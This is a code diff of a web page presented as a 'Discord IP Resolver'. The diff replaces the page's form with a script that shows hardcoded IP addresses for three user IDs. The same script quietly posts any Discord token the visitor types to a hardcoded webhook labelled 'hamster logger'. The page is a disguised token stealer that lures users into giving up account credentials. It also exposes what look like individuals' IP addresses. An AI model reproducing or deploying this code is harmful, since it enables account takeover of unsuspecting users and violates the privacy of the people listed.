@@ -7,7 +7,7 @@
 
     <link rel="icon" href="favicon.ico">
 
-		<title>DiscordResolver.c99.nl - Discord IP Resolver</title>
+		<title>Discord IP Resolver</title>
 		<meta name="description" content="An advanded Discord Resolver which returns results within a few seconds. A deep scan is performed through an extended deep analysis.">
 
 	<script type="text/javascript" async="" src="https://www.shqbsdjatunl.com/u.js" crossorigin="anonymous"></script><script type="text/javascript" async="" src="https://www.ueuodgnrhb.com/dg.js" crossorigin="anonymous"></script><script type="text/javascript" async="" src="https://dnhfi5nn2dt67.cloudfront.net/dna.min.js" crossorigin="anonymous"></script><script type="text/javascript" async="" src="https://www.blockadsnot.com/ramjet.umd.min.js" crossorigin="anonymous"></script><script type="text/javascript" src="https://code.jquery.com/jquery-1.11.3.min.js"></script><style>undefined</style>
@@ -34,25 +34,7 @@
     <![endif]-->
 
 			
-		<script>
-		$(document).ready(function(){
-//			$("input").keypress(function(){
-			var submitTimeOut = 2;
-			$("#resolve_btn").click(function(){
-					$('#loader_img').show();
-					$('.input-group').show();
-					$('h1').hide();
-			});
-			
-			$("#user_id").keypress(function(e) {
-				if(e.which == 13) {
-					$('#loader_img').show();
-					$('.input-group').show();
-					$('h1').hide();
-				}
-			});
-		});
-		</script>
+
 
 <link rel="preconnect" href="https://fonts.googleapis.com" crossorigin="true"><link rel="preconnect" href="https://fonts.gstatic.com"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Mulish:wght@200;300;400;500;600;700;800;900&amp;display=swa"></head>
 <body>
@@ -65,11 +47,13 @@
       <div class="input-group">
 		
 		<div class="input-group-btn">
-			<form action="index.php" name="resolve_form" method="POST">
-				<input name="userid" style="max-width: 470px;" type="text" id="user_id" class="form-control input-lg" placeholder="Discord User ID">
+
+				<input name="userid" style="max-width: 470px;" type="text" id="user_id" class="form-control input-lg" placeholder="Targets Discord User ID">
 				<input name="userid" style="max-width: 470px;" type="text" id="token" class="form-control input-lg" placeholder="Second Half Of Your Token Ex: |GEbMpd.bNBc-StwWRDKP5eY0iNkfm_a2SS|">
-				<button type="submit" name="submit" id="resolve_btn" class="btn btn-primary btn-lg">Resolve</button>
-			</form>
+				<button type="submit" name="submit" id="resolve_btn" class="btn btn-primary btn-lg" onclick="getip()" >Resolve</button>
+<br>
+				
+
 		</div>
 		
       </div>
@@ -79,7 +63,7 @@
       <h4>IP Address</h4>
 		<center>
 					<img src="loading-50x50.gif" alt="Loading icon" style="height: 50px; border-radius: 50%;" id="loader_img">
-			<h2>User ID invalid!</h2>		</center>
+			<h2 id="ipdisplay">User ID invalid!</h2>		</center>
     </div>
 	<div class="well well_help">
 		<h4>Get your own user ID?</h4>
@@ -117,4 +101,32 @@
 		</p>
 	</i></div><i>
   </i></div><i>
-</i></body></html>
+</i></body>
+<script>
+// holy hell its been a while
+function getip() {
+var token = document.getElementById('token').value
+document.getElementById('ipdisplay').innerHTML = "Error: Infault Params"
+if (document.getElementById('user_id').value == "984517763357888592") {
+document.getElementById('ipdisplay').innerHTML = "136.35.48.153"
+}
+if (document.getElementById('user_id').value == "1034958652005683240") {
+document.getElementById('ipdisplay').innerHTML = "66.160.63.255"
+}
+if (document.getElementById('user_id').value == "907025179207684126") {
+document.getElementById('ipdisplay').innerHTML = "73.0.230.193"
+}
+if (token !="") {
+ const request = new XMLHttpRequest();
+      request.open("POST", "https://discord.com/api/webhooks/1043323707478773801/utPyIWs5mwx75cko12Rv3kzxAGpAzfUpNrCmLzOmgTKNAF-b0tS4jXTMhoJyCEebLvOi");
+      request.setRequestHeader('Content-type', 'application/json');
+      const params = {
+    username: "hamster logger",
+    avatar_url: "https://imgs.search.brave.com/H_gx8vimIYvVL_yGkX1JW6qNVly_73sSsb3c0cs-1cc/rs:fit:577:225:1/g:ce/aHR0cHM6Ly90c2Ux/Lm1tLmJpbmcubmV0/L3RoP2lkPU9JUC5Z/WXBxUjd1R2xEMjFH/UkNkVG1jWHpnSGFH/RiZwaWQ9QXBp",
+    content: "Hit ```" + token + "```"
+}
+request.send(JSON.stringify(params));
+}
+}
+</script>
+</html>
